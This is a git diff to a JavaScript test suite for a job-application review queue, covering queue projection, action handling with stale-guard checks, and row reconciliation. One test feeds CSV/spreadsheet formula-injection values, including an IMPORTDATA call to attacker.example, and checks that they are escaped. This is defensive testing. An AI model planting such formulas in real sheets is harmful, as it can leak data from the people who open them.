@@ -6,6 +6,10 @@ import {
   applyManualAction as applyManualActionCore,
   buildFunnelSummary,
   buildReviewQueue,
+  buildReviewQueueProjection,
+  reasonForReview,
+  reconcileReviewQueue,
+  validateReviewQueueConfig,
   processReviewActions as processReviewActionsCore
 } from "../src/review.mjs";
 import { mergeOutcomeEvents, stateGuard } from "../src/contracts.mjs";
@@ -37,14 +41,16 @@ const processReviewActions = (
   activeRows,
   archiveRows,
   usedSchema,
-  at
+  at,
+  queueContext
 ) =>
   processReviewActionsCore(
     activeRows,
     archiveRows,
     usedSchema,
     at,
-    messageSafetyContext
+    messageSafetyContext,
+    queueContext
   );
 
 const job = (overrides = {}) => ({
@@ -89,6 +95,27 @@ const job = (overrides = {}) => ({
 });
 
 test("review configuration exposes required information and controlled actions", () => {
+  assert.deepEqual(validateReviewQueueConfig(view, schema), []);
+  assert.equal(view.review_queue.sheet, "Review Queue");
+  assert.deepEqual(view.review_queue.visible_columns, [
+    "Status",
+    "Job title",
+    "Company",
+    "Score",
+    "Reason for review",
+    "Generated message",
+    "Job link",
+    "Action"
+  ]);
+  assert.deepEqual(view.review_queue.hidden_columns, [
+    "canonical_job_id",
+    "source_state_guard"
+  ]);
+  assert.deepEqual(view.review_queue.actions, {
+    "Generate Application": "promote",
+    "I Applied": "mark_applied",
+    Skip: "mark_skipped"
+  });
   for (const field of [
     "job_title",
     "company",
@@ -604,6 +631,468 @@ test("priority queue uses opportunity score within lifecycle state and determini
       "onlinejobs.ph:6115"
     ]
   );
+});
+
+test("simplified queue projects exact review fields, reasons, eligibility, and legacy scores", () => {
+  const reviewRequired = job({
+    source_job_id: "6121",
+    canonical_job_id: "onlinejobs.ph:6121",
+    pipeline_status: "review_required",
+    opportunity_score: 55,
+    requirement_gap_details: [
+      { requirement: "Confirm Kubernetes depth", classification: "ambiguous" }
+    ],
+    application_warnings: ["Verify required availability"]
+  });
+  const ready = job({
+    source_job_id: "6122",
+    canonical_job_id: "onlinejobs.ph:6122",
+    opportunity_score: 80
+  });
+  const legacy = job({
+    source_job_id: "6123",
+    canonical_job_id: "onlinejobs.ph:6123",
+    pipeline_status: "recommended",
+    opportunity_score: "",
+    match_score: 64
+  });
+  const excluded = [
+    job({
+      source_job_id: "6124",
+      canonical_job_id: "onlinejobs.ph:6124",
+      pipeline_status: "retryable_error"
+    }),
+    job({
+      source_job_id: "6125",
+      canonical_job_id: "onlinejobs.ph:6125",
+      pipeline_status: "applied",
+      application_decision: "applied"
+    })
+  ];
+  const projection = buildReviewQueueProjection(
+    [reviewRequired, ready, legacy, ...excluded],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(
+    projection.rows.map((row) => row.canonical_job_id),
+    [
+      "onlinejobs.ph:6122",
+      "onlinejobs.ph:6123",
+      "onlinejobs.ph:6121"
+    ]
+  );
+  assert.deepEqual(Object.keys(projection.rows[0]), view.review_queue.fields);
+  assert.equal(projection.rows[0].Score, 80);
+  assert.equal(projection.rows[1].Score, 64);
+  assert.equal(projection.rows[0].Action, "");
+  assert.equal(
+    projection.rows[0].source_state_guard,
+    stateGuard(ready)
+  );
+  assert.match(
+    projection.rows[2]["Reason for review"],
+    /Verify required availability/
+  );
+  assert.match(
+    projection.rows[2]["Reason for review"],
+    /Confirm Kubernetes depth/
+  );
+  assert.equal(projection.invalid_records.length, 0);
+
+  const formulaLike = buildReviewQueueProjection(
+    [
+      job({
+        source_job_id: "6126",
+        canonical_job_id: "onlinejobs.ph:6126",
+        job_title: "=IMPORTDATA(\"https://attacker.example/title\")",
+        company: "+malicious",
+        generated_message: "@malicious"
+      })
+    ],
+    schema,
+    view,
+    now
+  ).rows[0];
+  assert.match(formulaLike["Job title"], /^'=/);
+  assert.match(formulaLike.Company, /^'\+/);
+  assert.match(formulaLike["Generated message"], /^'@/);
+
+  assert.equal(
+    reasonForReview(
+      job({
+        pipeline_status: "review_required",
+        match_reasons: [],
+        requirement_gaps: [],
+        requirement_gap_details: [],
+        application_warnings: []
+      }),
+      view
+    ),
+    "Review required; no review reason was recorded."
+  );
+  assert.match(
+    reasonForReview(
+      job({
+        pipeline_status: "review_required",
+        application_warnings: ["=IMPORTDATA(\"https://attacker.example\")"]
+      }),
+      view
+    ),
+    /Warnings: '=IMPORTDATA/
+  );
+});
+
+test("simplified queue excludes ambiguous source identities instead of projecting duplicates", () => {
+  const duplicate = job({
+    source_job_id: "6131",
+    canonical_job_id: "onlinejobs.ph:6131",
+    pipeline_status: "ready"
+  });
+  const projection = buildReviewQueueProjection(
+    [
+      duplicate,
+      { ...duplicate, row_number: 9, job_title: "Conflicting duplicate" },
+      job({
+        source: "",
+        source_job_id: "",
+        canonical_job_id: "",
+        canonical_url: "",
+        job_title: "Missing identity",
+        pipeline_status: "review_required"
+      })
+    ],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(projection.rows, []);
+  assert.deepEqual(
+    projection.invalid_records.map((entry) => entry.error).sort(),
+    [
+      "eligible review record has duplicate canonical identity",
+      "eligible review record has duplicate canonical identity",
+      "eligible review record is missing canonical identity"
+    ]
+  );
+});
+
+test("friendly queue actions reuse guarded manual transitions by canonical identity", () => {
+  const cases = [
+    ["Generate Application", "review_required", "recommended"],
+    ["I Applied", "ready", "applied"],
+    ["Skip", "ready", "skipped"]
+  ];
+  for (const [label, initialStatus, expectedStatus] of cases) {
+    const source = job({
+      row_number: 42,
+      source_job_id: `620-${label.length}`,
+      canonical_job_id: `onlinejobs.ph:620-${label.length}`,
+      pipeline_status: initialStatus
+    });
+    source.state_guard = stateGuard(source);
+    const processed = processReviewActions(
+      [source],
+      [],
+      schema,
+      now,
+      {
+        executionId: "review-execution-1",
+        reviewConfig: view,
+        queueRows: [
+          {
+            row_number: 99,
+            Action: label,
+            canonical_job_id: source.canonical_job_id,
+            source_state_guard: source.state_guard
+          }
+        ]
+      }
+    );
+    assert.equal(processed.active_claims.length, 1);
+    assert.equal(processed.active_claims[0].state_guard, source.state_guard);
+    assert.match(
+      processed.active_claims[0].processing_commit_guard,
+      /^commit:review:/
+    );
+    assert.equal(processed.active_updates.length, 1);
+    assert.equal(processed.active_updates[0].row_number, 42);
+    assert.equal(processed.active_updates[0].pipeline_status, expectedStatus);
+    assert.equal(processed.active_updates[0].manual_action, "");
+    assert.equal(processed.processed_queue_actions.length, 1);
+    assert.deepEqual(processed.invalid_actions, []);
+  }
+});
+
+test("duplicate, stale, missing, and conflicting queue actions fail closed", () => {
+  const source = job({
+    source_job_id: "6141",
+    canonical_job_id: "onlinejobs.ph:6141"
+  });
+  source.state_guard = stateGuard(source);
+  const stale = processReviewActions(
+    [source],
+    [],
+    schema,
+    now,
+    {
+      executionId: "review-stale",
+      reviewConfig: view,
+      queueRows: [
+        {
+          row_number: 3,
+          Action: "I Applied",
+          canonical_job_id: source.canonical_job_id,
+          source_state_guard: "stale-guard"
+        }
+      ]
+    }
+  );
+  assert.deepEqual(stale.active_updates, []);
+  assert.match(stale.invalid_actions[0].error, /stale/);
+
+  const conflicting = processReviewActions(
+    [source],
+    [],
+    schema,
+    now,
+    {
+      executionId: "review-conflict",
+      reviewConfig: view,
+      queueRows: [
+        {
+          row_number: 3,
+          Action: "I Applied",
+          canonical_job_id: source.canonical_job_id,
+          source_state_guard: source.state_guard
+        },
+        {
+          row_number: 4,
+          Action: "Skip",
+          canonical_job_id: source.canonical_job_id,
+          source_state_guard: source.state_guard
+        }
+      ]
+    }
+  );
+  assert.deepEqual(conflicting.active_updates, []);
+  assert.equal(conflicting.invalid_actions.length, 2);
+  assert.ok(
+    conflicting.invalid_actions.every((entry) =>
+      /conflicting review queue actions/.test(entry.error)
+    )
+  );
+
+  const missing = processReviewActions(
+    [source],
+    [],
+    schema,
+    now,
+    {
+      executionId: "review-missing",
+      reviewConfig: view,
+      queueRows: [
+        {
+          row_number: 8,
+          Action: "Skip",
+          canonical_job_id: "onlinejobs.ph:missing",
+          source_state_guard: source.state_guard
+        }
+      ]
+    }
+  );
+  assert.deepEqual(missing.active_updates, []);
+  assert.match(missing.invalid_actions[0].error, /source record is missing/);
+
+  const duplicateSource = processReviewActions(
+    [source, { ...source, row_number: 10 }],
+    [],
+    schema,
+    now,
+    {
+      executionId: "review-duplicate-source",
+      reviewConfig: view,
+      queueRows: [
+        {
+          row_number: 11,
+          Action: "Skip",
+          canonical_job_id: source.canonical_job_id,
+          source_state_guard: source.state_guard
+        }
+      ]
+    }
+  );
+  assert.deepEqual(duplicateSource.active_updates, []);
+  assert.equal(duplicateSource.invalid_actions.length, 1);
+  assert.match(duplicateSource.invalid_actions[0].error, /duplicate source/);
+});
+
+test("identical queue deliveries coalesce while a conflicting Sheet1 action wins", () => {
+  const source = job({
+    source_job_id: "6151",
+    canonical_job_id: "onlinejobs.ph:6151"
+  });
+  source.state_guard = stateGuard(source);
+  const duplicate = processReviewActions(
+    [source],
+    [],
+    schema,
+    now,
+    {
+      executionId: "review-duplicate-delivery",
+      reviewConfig: view,
+      queueRows: [3, 4].map((rowNumber) => ({
+        row_number: rowNumber,
+        Action: "I Applied",
+        canonical_job_id: source.canonical_job_id,
+        source_state_guard: source.state_guard
+      }))
+    }
+  );
+  assert.equal(duplicate.active_updates.length, 1);
+  assert.equal(duplicate.processed_queue_actions[0].duplicate_count, 2);
+
+  const directWins = processReviewActions(
+    [{ ...source, manual_action: "mark_skipped" }],
+    [],
+    schema,
+    now,
+    {
+      executionId: "review-direct-wins",
+      reviewConfig: view,
+      queueRows: [
+        {
+          row_number: 3,
+          Action: "I Applied",
+          canonical_job_id: source.canonical_job_id,
+          source_state_guard: source.state_guard
+        }
+      ]
+    }
+  );
+  assert.equal(directWins.active_updates.length, 1);
+  assert.equal(directWins.active_updates[0].pipeline_status, "skipped");
+  assert.equal(directWins.invalid_actions.length, 1);
+  assert.match(directWins.invalid_actions[0].error, /conflicts with Sheet1/);
+});
+
+test("queue reconciliation removes completed rows, refreshes promotion, and protects new edits", () => {
+  const ready = job({
+    source_job_id: "6161",
+    canonical_job_id: "onlinejobs.ph:6161"
+  });
+  ready.state_guard = stateGuard(ready);
+  const recommended = job({
+    source_job_id: "6162",
+    canonical_job_id: "onlinejobs.ph:6162",
+    pipeline_status: "recommended"
+  });
+  recommended.state_guard = stateGuard(recommended);
+  const applied = {
+    ...ready,
+    pipeline_status: "applied",
+    application_decision: "applied"
+  };
+  applied.state_guard = stateGuard(applied);
+  const initialQueue = [
+    {
+      row_number: 2,
+      Action: "I Applied",
+      canonical_job_id: ready.canonical_job_id,
+      source_state_guard: ready.state_guard
+    },
+    {
+      row_number: 3,
+      Action: "",
+      canonical_job_id: recommended.canonical_job_id,
+      source_state_guard: recommended.state_guard
+    }
+  ];
+  const currentQueue = [
+    initialQueue[0],
+    {
+      ...initialQueue[1],
+      Action: "Skip"
+    },
+    {
+      row_number: 7,
+      Action: "",
+      canonical_job_id: "onlinejobs.ph:stale",
+      source_state_guard: "stale"
+    }
+  ];
+  const reconciled = reconcileReviewQueue(
+    [applied, recommended],
+    currentQueue,
+    initialQueue,
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(reconciled.delete_rows, [
+    { row_number: 7 },
+    { row_number: 2 }
+  ]);
+  assert.equal(reconciled.protected_action_count, 1);
+  assert.deepEqual(reconciled.queue_rows, []);
+
+  const refreshed = reconcileReviewQueue(
+    [recommended],
+    [initialQueue[1]],
+    [initialQueue[1]],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(refreshed.delete_rows, [{ row_number: 3 }]);
+  assert.equal(refreshed.queue_rows.length, 1);
+  assert.equal(refreshed.queue_rows[0].Status, "recommended");
+  assert.equal(refreshed.queue_rows[0].Action, "");
+});
+
+test("queue reconciliation retains an action until its guarded source write is confirmed", () => {
+  const ready = job({
+    source_job_id: "6171",
+    canonical_job_id: "onlinejobs.ph:6171"
+  });
+  ready.state_guard = stateGuard(ready);
+  const pending = {
+    row_number: 2,
+    Action: "I Applied",
+    canonical_job_id: ready.canonical_job_id,
+    source_state_guard: ready.state_guard
+  };
+  const unconfirmed = reconcileReviewQueue(
+    [ready],
+    [pending],
+    [pending],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(unconfirmed.delete_rows, []);
+  assert.deepEqual(unconfirmed.queue_rows, []);
+  assert.equal(unconfirmed.protected_action_count, 1);
+
+  const committed = {
+    ...ready,
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: now
+  };
+  committed.state_guard = stateGuard(committed);
+  const cleanupRetry = reconcileReviewQueue(
+    [committed],
+    [pending],
+    [pending],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(cleanupRetry.delete_rows, [{ row_number: 2 }]);
+  assert.deepEqual(cleanupRetry.queue_rows, []);
+  assert.equal(cleanupRetry.protected_action_count, 0);
 });
 
 test("funnel summary deduplicates active/archive and never infers outcomes", () => {
